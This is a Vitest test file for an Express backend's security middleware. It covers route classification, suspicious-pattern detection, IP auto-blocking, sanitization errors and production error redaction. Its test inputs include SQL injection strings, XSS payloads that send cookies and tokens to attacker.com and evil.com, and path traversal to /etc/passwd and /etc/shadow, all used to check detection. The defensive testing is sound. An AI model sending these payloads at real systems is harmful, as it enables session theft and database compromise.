import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import express from 'express';
import http from 'http';
import {
  enhancedSecurity,
  detectSuspiciousPatterns,
  isCodeOrInterviewRoute,
  resetSecurityState,
  suspiciousIPs,
} from '../../middleware/securityEnhanced.js';
import { sanitizeInput } from '../../middleware/sanitization.js';
import { errorHandler, AppError, ErrorCodes } from '../../middleware/errorHandler.js';

describe('Challenger 2 Empirical Challenge: Milestone 2 Backend Security, Middleware & Core Utilities', () => {
  const originalEnv = { ...process.env };

  beforeEach(() => {
    process.env = { ...originalEnv };
    resetSecurityState();
  });

  afterEach(() => {
    process.env = { ...originalEnv };
    resetSecurityState();
    vi.restoreAllMocks();
  });

  // Helper to start an Express app on an ephemeral port and close it
  const withTestServer = (app, callback) => {
    return new Promise((resolve, reject) => {
      const server = http.createServer(app);
      server.listen(0, '127.0.0.1', () => {
        const { port } = server.address();
        const baseUrl = `http://127.0.0.1:${port}`;
        Promise.resolve(callback(baseUrl))
          .then(() => server.close(() => resolve()))
          .catch((err) => server.close(() => reject(err)));
      });
    });
  };

  // =========================================================================
  // CHALLENGE 1: enhancedSecurity() Route Discrimination & Auto-Blocking
  // =========================================================================
  describe('Challenge 1: enhancedSecurity() Behavior on Standard vs Code Execution Routes', () => {
    it('exhaustively recognizes all specified code, practice, and interview route prefixes', () => {
      const codeRoutes = [
        '/api/code/run',
        '/api/code/compile',
        '/api/practice/run',
        '/api/practice/submit',
        '/api/interview/session/next-question',
        '/api/interview-enhanced/evaluate',
        '/api/interview-suite/turn',
        '/api/company-interview/question',
        '/api/companyInterview/start',
        '/api/fresher-interview/answer',
        '/api/peer-interview/sync',
        '/api/peerInterview/signal',
        '/api/real-interview/feedback',
        '/api/system-design/architecture',
        '/api/submissions/record',
        '/api/dsa/solve',
        '/api/playground/execute',
        '/code/execute',
        '/practice/timed',
        '/interview/live',
        '/submissions/history',
      ];

      for (const route of codeRoutes) {
        expect(isCodeOrInterviewRoute({ originalUrl: route })).toBe(true);
        expect(isCodeOrInterviewRoute({ url: route })).toBe(true);
        expect(isCodeOrInterviewRoute({ path: route })).toBe(true);
      }
    });

    it('identifies standard / non-coding routes as NOT code routes', () => {
      const standardRoutes = [
        '/api/auth/login',
        '/api/auth/register',
        '/api/auth/reset-password',
        '/api/user/profile',
        '/api/admin/users',
        '/api/admin/metrics',
        '/api/payment/checkout',
        '/api/notes/create',
        '/api/feedback/submit',
        '/api/employer/candidates',
        '/api/feed/public',
      ];

      for (const route of standardRoutes) {
        expect(isCodeOrInterviewRoute({ originalUrl: route })).toBe(false);
      }
    });

    it('empirically detects SQL injection attack vectors in body on standard routes', () => {
      const maliciousPayloads = [
        { email: "admin' UNION SELECT id, password_hash, token FROM users--" },
        { statement: "INSERT INTO admin_users (username, role) VALUES ('hacker', 'superadmin');" },
        { bio: "Robert'); DROP TABLE students;--" },
        { filter: "1' UNION ALL SELECT NULL, NULL, version()--" },
      ];

      for (const body of maliciousPayloads) {
        const req = {
          originalUrl: '/api/auth/login',
          query: {},
          body,
        };
        const detected = detectSuspiciousPatterns(req);
        expect(detected, `Failed to detect SQL injection in: ${JSON.stringify(body)}`).not.toBeNull();
      }
    });

    it('empirically detects XSS and path traversal attack vectors in body on standard routes', () => {
      const maliciousPayloads = [
        { comment: "<script>window.location='http://attacker.com/steal?c='+document.cookie</script>" },
        { avatar: "javascript:void(document.write('xss'))" },
        { banner: "<img src='invalid' onerror='fetch(\"http://evil.com/\"+localStorage.getItem(\"token\"))'>" },
        { hook: "<body onload=alert('xss')>" },
        { backupPath: "/etc/passwd" },
        { configDir: "..\\..\\windows\\system32\\drivers\\etc\\hosts" },
      ];

      for (const body of maliciousPayloads) {
        const req = {
          originalUrl: '/api/user/profile',
          query: {},
          body,
        };
        const detected = detectSuspiciousPatterns(req);
        expect(detected, `Failed to detect attack pattern in: ${JSON.stringify(body)}`).not.toBeNull();
      }
    });

    it('permits legitimate candidate code containing SQL and JS constructs on code routes', () => {
      const validCodeSubmissions = [
        {
          language: 'sql',
          code: `
            -- Solution to LeetCode 178: Rank Scores
            SELECT score, DENSE_RANK() OVER (ORDER BY score DESC) AS 'rank'
            FROM Scores
            UNION SELECT 0, 0
            WHERE 1=0;
          `,
        },
        {
          language: 'sql',
          code: `
            CREATE TABLE #temp (id INT);
            INSERT INTO #temp VALUES (1), (2);
            DROP TABLE #temp;
          `,
        },
        {
          language: 'javascript',
          code: `
            // Frontend error logging harness
            window.onload = function() {
              const img = new Image();
              img.onerror = function() { console.error('Image load failed'); };
              img.src = '/assets/logo.png';
            };
          `,
        },
        {
          language: 'javascript',
          code: `
            function injectScript(src) {
              const tag = document.createElement('script');
              tag.src = src;
              document.head.appendChild(tag);
            }
          `,
        },
      ];

      for (const body of validCodeSubmissions) {
        const req = {
          originalUrl: '/api/practice/run',
          query: {},
          body,
        };
        const detected = detectSuspiciousPatterns(req);
        expect(detected, `False positive detected on code route for: ${JSON.stringify(body)}`).toBeNull();
      }
    });

    it('adversarial test: detects query param traversal or SQL injection even on code routes', () => {
      const hostileCodeRequests = [
        {
          originalUrl: '/api/code/run',
          query: { file: '../../etc/shadow' },
          body: { code: 'console.log("hello");' },
        },
        {
          originalUrl: '/api/practice/execute',
          query: { problemId: "1' UNION SELECT credit_card FROM accounts--" },
          body: { code: 'def solution(): return True' },
        },
      ];

      for (const req of hostileCodeRequests) {
        const detected = detectSuspiciousPatterns(req);
        expect(detected, `Failed to detect attack in query param on code route: ${JSON.stringify(req.query)}`).not.toBeNull();
      }
    });

    it('auto-blocks IP after 4 suspicious requests on standard routes and rejects with 403', () => {
      const middleware = enhancedSecurity();
      const attackerIp = '203.0.113.195';

      // First 3 requests trigger 400 Bad Request
      for (let i = 1; i <= 3; i++) {
        const req = {
          ip: attackerIp,
          method: 'POST',
          originalUrl: '/api/auth/login',
          headers: { 'content-type': 'application/json' },
          query: {},
          body: { attack: `' UNION SELECT ${i}, 'admin' FROM users--` },
        };
        const res = {
          status: vi.fn().mockReturnThis(),
          json: vi.fn(),
          setHeader: vi.fn(),
        };
        const next = vi.fn();

        middleware(req, res, next);
        expect(res.status).toHaveBeenCalledWith(400);
        expect(res.json).toHaveBeenCalledWith(expect.objectContaining({
          error: 'Invalid request',
          message: 'Request contains suspicious patterns',
        }));
        expect(next).not.toHaveBeenCalled();
      }

      // Check IP record: 3 suspicious patterns, not yet blocked
      let ipRecord = suspiciousIPs.get(attackerIp);
      expect(ipRecord.suspiciousPatterns).toBe(3);
      expect(ipRecord.blocked).toBe(false);

      // 4th attack request crosses threshold (> 3)
      const req4 = {
        ip: attackerIp,
        method: 'POST',
        originalUrl: '/api/auth/login',
        headers: { 'content-type': 'application/json' },
        query: {},
        body: { attack: "' UNION SELECT 4, 'root' FROM admins--" },
      };
      const res4 = {
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
        setHeader: vi.fn(),
      };
      const next4 = vi.fn();

      middleware(req4, res4, next4);
      expect(res4.status).toHaveBeenCalledWith(400);

      // Now IP is marked blocked
      ipRecord = suspiciousIPs.get(attackerIp);
      expect(ipRecord.suspiciousPatterns).toBe(4);
      expect(ipRecord.blocked).toBe(true);

      // 5th request (even a completely benign GET request) is rejected with 403 Forbidden
      const req5 = {
        ip: attackerIp,
        method: 'GET',
        originalUrl: '/api/user/profile',
        headers: {},
        query: {},
      };
      const res5 = {
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
        setHeader: vi.fn(),
      };
      const next5 = vi.fn();

      middleware(req5, res5, next5);
      expect(res5.status).toHaveBeenCalledWith(403);
      expect(res5.json).toHaveBeenCalledWith({
        error: 'Access denied',
        message: 'Your IP has been temporarily blocked due to suspicious activity',
      });
      expect(next5).not.toHaveBeenCalled();
    });

    it('candidate submitting repeated valid code solutions does NOT trigger IP block', () => {
      const middleware = enhancedSecurity();
      const studentIp = '198.51.100.99';

      // Simulate 15 consecutive code submissions with complex SQL and JS patterns
      for (let i = 0; i < 15; i++) {
        const req = {
          ip: studentIp,
          method: 'POST',
          originalUrl: '/api/submissions/submit',
          headers: { 'content-type': 'application/json' },
          query: {},
          body: {
            problemId: `prob_${i}`,
            language: 'sql',
            code: `
              SELECT dept_id, AVG(salary) FROM employee
              GROUP BY dept_id
              UNION SELECT 'all', AVG(salary) FROM employee;
              -- Attempt ${i}
            `,
          },
        };
        const res = {
          status: vi.fn().mockReturnThis(),
          json: vi.fn(),
          setHeader: vi.fn(),
        };
        const next = vi.fn();

        middleware(req, res, next);
        expect(next).toHaveBeenCalledTimes(1);
        expect(res.status).not.toHaveBeenCalled();
      }

      const ipRecord = suspiciousIPs.get(studentIp);
      expect(ipRecord).toBeDefined();
      expect(ipRecord.suspiciousPatterns).toBe(0);
      expect(ipRecord.blocked).toBe(false);
    });

    it('rejects unsupported Content-Types with 415 on POST/PUT/PATCH', () => {
      const middleware = enhancedSecurity();
      const testIp = '192.0.2.10';

      const unsupportedTypes = ['application/xml', 'text/html', 'application/pdf', 'video/mp4'];
      for (const contentType of unsupportedTypes) {
        const req = {
          ip: testIp,
          method: 'POST',
          originalUrl: '/api/user/profile',
          headers: { 'content-type': contentType },
          query: {},
          body: {},
        };
        const res = {
          status: vi.fn().mockReturnThis(),
          json: vi.fn(),
          setHeader: vi.fn(),
        };
        const next = vi.fn();

        middleware(req, res, next);
        expect(res.status).toHaveBeenCalledWith(415);
        expect(res.json).toHaveBeenCalledWith(expect.objectContaining({
          error: 'Unsupported Media Type',
        }));
        expect(next).not.toHaveBeenCalled();
      }
    });
  });

  // =========================================================================
  // CHALLENGE 2: sanitization.js Error Handling & Single Response Guarantee
  // =========================================================================
  describe('Challenge 2: sanitization.js Error Handling & No ERR_HTTP_HEADERS_SENT', () => {
    it('returns exactly one 400 response and does not invoke next(error) when headers are not sent', () => {
      const middleware = sanitizeInput();

      // Object that throws when its properties are accessed
      const explodingObj = {};
      Object.defineProperty(explodingObj, 'unsafeField', {
        get() {
          throw new Error('Exploding property getter during deep sanitize');
        },
        enumerable: true,
      });

      const req = {
        originalUrl: '/api/notes',
        path: '/notes',
        body: explodingObj,
      };
      const res = {
        headersSent: false,
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
      };
      const next = vi.fn();

      middleware(req, res, next);

      expect(res.status).toHaveBeenCalledTimes(1);
      expect(res.status).toHaveBeenCalledWith(400);
      expect(res.json).toHaveBeenCalledTimes(1);
      expect(res.json).toHaveBeenCalledWith({ error: 'Invalid input data' });
      // CRITICAL: next must NOT be called, preventing downstream double-response
      expect(next).not.toHaveBeenCalled();
    });

    it('delegates to next(error) without calling res.status when headers are already sent', () => {
      const middleware = sanitizeInput();

      const explodingObj = {};
      Object.defineProperty(explodingObj, 'unsafeField', {
        get() {
          throw new Error('Exploding property getter');
        },
        enumerable: true,
      });

      const req = {
        originalUrl: '/api/notes',
        path: '/notes',
        body: explodingObj,
      };
      const res = {
        headersSent: true, // Simulating streamed or prematurely committed response
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
      };
      const next = vi.fn();

      middleware(req, res, next);

      expect(res.status).not.toHaveBeenCalled();
      expect(res.json).not.toHaveBeenCalled();
      expect(next).toHaveBeenCalledTimes(1);
      expect(next).toHaveBeenCalledWith(expect.any(Error));
    });

    it('empirically verifies an Express app handling sanitization errors never crashes with ERR_HTTP_HEADERS_SENT', async () => {
      const app = express();
      app.use(express.json());

      // Middleware that intentionally injects a circular object into req.body
      app.use((req, res, next) => {
        if (req.headers['x-test-explode'] === 'circular') {
          req.body = {};
          req.body.self = req.body;
        } else if (req.headers['x-test-explode'] === 'getter') {
          req.body = {};
          Object.defineProperty(req.body, 'trap', {
            get() { throw new Error('Exploding getter'); },
            enumerable: true,
          });
        }
        next();
      });

      app.use(sanitizeInput());

      app.post('/api/test-sanitization', (req, res) => {
        res.json({ success: true, body: req.body });
      });

      // Downstream error handler to catch any leaked next(error)
      const errorCapture = vi.fn();
      app.use((err, req, res, next) => {
        errorCapture(err);
        if (res.headersSent) {
          return next(err);
        }
        res.status(500).json({ error: 'Should not reach downstream 500' });
      });

      await withTestServer(app, async (baseUrl) => {
        // Test 1: Normal input passes cleanly
        const res1 = await fetch(`${baseUrl}/api/test-sanitization`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ message: 'Hello World' }),
        });
        const body1 = await res1.json();
        expect(res1.status).toBe(200);
        expect(body1.body.message).toBe('Hello World');
        expect(errorCapture).not.toHaveBeenCalled();

        // Test 2: Circular input triggers 400 without downstream double-header crash
        const res2 = await fetch(`${baseUrl}/api/test-sanitization`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-test-explode': 'circular',
          },
          body: JSON.stringify({ initial: 'test' }),
        });
        const body2 = await res2.json();
        expect(res2.status).toBe(400);
        expect(body2).toEqual({ error: 'Invalid input data' });
        expect(errorCapture).not.toHaveBeenCalled();

        // Test 3: Throwing getter triggers 400 without downstream double-header crash
        const res3 = await fetch(`${baseUrl}/api/test-sanitization`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-test-explode': 'getter',
          },
          body: JSON.stringify({ initial: 'test' }),
        });
        const body3 = await res3.json();
        expect(res3.status).toBe(400);
        expect(body3).toEqual({ error: 'Invalid input data' });
        expect(errorCapture).not.toHaveBeenCalled();
      });
    });

    it('skips sanitization completely for configured skipPaths', () => {
      const middleware = sanitizeInput({ skipPaths: ['/payment/webhook', '/stripe/webhook'] });

      const explodingObj = {};
      Object.defineProperty(explodingObj, 'unsafe', {
        get() { throw new Error('Boom'); },
        enumerable: true,
      });

      const req = {
        originalUrl: '/api/payment/webhook',
        path: '/payment/webhook',
        body: explodingObj,
      };
      const res = {
        headersSent: false,
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
      };
      const next = vi.fn();

      middleware(req, res, next);
      expect(next).toHaveBeenCalledWith();
      expect(res.status).not.toHaveBeenCalled();
    });
  });

  // =========================================================================
  // CHALLENGE 3: errorHandler.js Production Information Disclosure Hardening
  // =========================================================================
  describe('Challenge 3: errorHandler.js Information Disclosure in Production Mode', () => {
    it('sanitizes fatal PostgreSQL connection and authentication errors in production', () => {
      process.env.NODE_ENV = 'production';

      const pgAuthError = new Error('FATAL: password authentication failed for user "postgres_superuser"');
      pgAuthError.code = '28P01';

      const req = { method: 'POST', originalUrl: '/api/auth/login', requestId: 'req_test_pg_1' };
      const res = {
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
      };
      const next = vi.fn();

      errorHandler(pgAuthError, req, res, next);

      expect(res.status).toHaveBeenCalledWith(500);
      const response = res.json.mock.calls[0][0];

      expect(response.success).toBe(false);
      expect(response.error).toBe('Internal server error');
      expect(response.message).toBe('Internal server error');
      expect(response.code).toBe(ErrorCodes.INTERNAL_ERROR);
      expect(response.requestId).toBe('req_test_pg_1');

      // Verify ZERO disclosure of internal credentials or db details
      expect(response.stack).toBeUndefined();
      expect(response.details).toBeUndefined();
      const stringified = JSON.stringify(response);
      expect(stringified).not.toContain('postgres');
      expect(stringified).not.toContain('password');
      expect(stringified).not.toContain('authentication');
      expect(stringified).not.toContain('28P01');
    });

    it('sanitizes PostgreSQL syntax and schema query errors in production', () => {
      process.env.NODE_ENV = 'production';

      const syntaxError = new Error('relation "user_payment_methods" does not exist at character 35: SELECT card_token, cvv FROM user_payment_methods WHERE user_id = $1');
      syntaxError.code = '42P01';

      const req = { method: 'GET', originalUrl: '/api/billing/methods', requestId: 'req_test_pg_2' };
      const res = {
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
      };
      const next = vi.fn();

      errorHandler(syntaxError, req, res, next);

      expect(res.status).toHaveBeenCalledWith(500);
      const response = res.json.mock.calls[0][0];

      expect(response.error).toBe('Internal server error');
      expect(response.message).toBe('Internal server error');
      expect(response.stack).toBeUndefined();

      const stringified = JSON.stringify(response);
      expect(stringified).not.toContain('user_payment_methods');
      expect(stringified).not.toContain('card_token');
      expect(stringified).not.toContain('cvv');
      expect(stringified).not.toContain('SELECT');
    });

    it('sanitizes Supabase PostgREST client driver crashes in production', () => {
      process.env.NODE_ENV = 'production';

      const supabaseError = new Error('getaddrinfo ENOTFOUND preploop-prod.supabase.co:5432');
      supabaseError.code = 'ENOTFOUND';

      const req = { method: 'GET', originalUrl: '/api/feed', requestId: 'req_test_pg_3' };
      const res = {
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
      };
      const next = vi.fn();

      errorHandler(supabaseError, req, res, next);

      expect(res.status).toHaveBeenCalledWith(500);
      const response = res.json.mock.calls[0][0];

      expect(response.error).toBe('Internal server error');
      expect(response.stack).toBeUndefined();
      expect(JSON.stringify(response)).not.toContain('supabase.co');
      expect(JSON.stringify(response)).not.toContain('ENOTFOUND');
    });

    it('preserves user-facing messages for operational AppErrors in production', () => {
      process.env.NODE_ENV = 'production';

      const operationalErrors = [
        new AppError('The requested interview session does not exist or has expired', 404, ErrorCodes.NOT_FOUND),
        new AppError('You do not have permission to view candidate evaluations', 403, ErrorCodes.FORBIDDEN),
        new AppError('Invalid question format: missing required test cases', 400, ErrorCodes.VALIDATION_ERROR),
        new AppError('Payment could not be processed: insufficient funds', 400, ErrorCodes.PAYMENT_FAILED),
      ];

      for (const err of operationalErrors) {
        const req = { method: 'GET', originalUrl: '/api/test', requestId: 'req_op' };
        const res = {
          status: vi.fn().mockReturnThis(),
          json: vi.fn(),
        };
        const next = vi.fn();

        errorHandler(err, req, res, next);

        expect(res.status).toHaveBeenCalledWith(err.statusCode);
        const response = res.json.mock.calls[0][0];
        expect(response.success).toBe(false);
        expect(response.error).toBe(err.message);
        expect(response.message).toBe(err.message);
        expect(response.code).toBe(err.code);
        expect(response.stack).toBeUndefined();
      }
    });

    it('preserves operational 500 messages (e.g. AI provider failure) when explicitly marked operational', () => {
      process.env.NODE_ENV = 'production';

      const aiServiceError = new AppError('AI synthesis provider temporarily unavailable. Please retry shortly.', 500, ErrorCodes.AI_SERVICE_ERROR);
      expect(aiServiceError.isOperational).toBe(true);

      const req = { method: 'POST', originalUrl: '/api/ai/synthesize', requestId: 'req_ai' };
      const res = {
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
      };
      const next = vi.fn();

      errorHandler(aiServiceError, req, res, next);

      expect(res.status).toHaveBeenCalledWith(500);
      const response = res.json.mock.calls[0][0];
      expect(response.error).toBe('AI synthesis provider temporarily unavailable. Please retry shortly.');
      expect(response.code).toBe(ErrorCodes.AI_SERVICE_ERROR);
      expect(response.stack).toBeUndefined();
    });

    it('redacts sensitive credentials (passwords, tokens, connection strings) in development mode details', () => {
      process.env.NODE_ENV = 'development';

      const devError = new Error('Database connection failed with credentials');
      devError.code = 'ECONNREFUSED';
      devError.password = 'super_secret_db_pass_123';
      devError.apiKey = 'sk_live_abcdef123456';
      devError.connectionString = 'postgresql://user:pass@db:5432/main';

      const req = { method: 'GET', originalUrl: '/api/dev', requestId: 'req_dev' };
      const res = {
        status: vi.fn().mockReturnThis(),
        json: vi.fn(),
      };
      const next = vi.fn();

      errorHandler(devError, req, res, next);

      expect(res.status).toHaveBeenCalledWith(500);
      const response = res.json.mock.calls[0][0];

      expect(response.stack).toBeDefined();
      expect(response.details).toBeDefined();
      // Verify sensitive values are redacted
      const stringified = JSON.stringify(response);
      expect(stringified).not.toContain('super_secret_db_pass_123');
      expect(stringified).not.toContain('sk_live_abcdef123456');
    });

    it('empirically verifies an Express route throwing unhandled DB error in production returns sanitized response', async () => {
      process.env.NODE_ENV = 'production';

      const app = express();
      app.use(express.json());

      // Route that simulates an unexpected database crash
      app.get('/api/db-test', (_req, _res, next) => {
        const dbErr = new Error('FATAL: pgbouncer: server connection closed unexpectedly (dbname=preploop_prod user=service_role)');
        dbErr.code = '08006';
        next(dbErr);
      });

      app.use(errorHandler);

      await withTestServer(app, async (baseUrl) => {
        const res = await fetch(`${baseUrl}/api/db-test`);
        expect(res.status).toBe(500);
        const body = await res.json();

        expect(body.success).toBe(false);
        expect(body.error).toBe('Internal server error');
        expect(body.message).toBe('Internal server error');
        expect(body.code).toBe(ErrorCodes.INTERNAL_ERROR);
        expect(body.stack).toBeUndefined();
        expect(body.details).toBeUndefined();

        const rawBody = JSON.stringify(body);
        expect(rawBody).not.toContain('pgbouncer');
        expect(rawBody).not.toContain('preploop_prod');
        expect(rawBody).not.toContain('service_role');
        expect(rawBody).not.toContain('08006');
      });
    });
  });
});
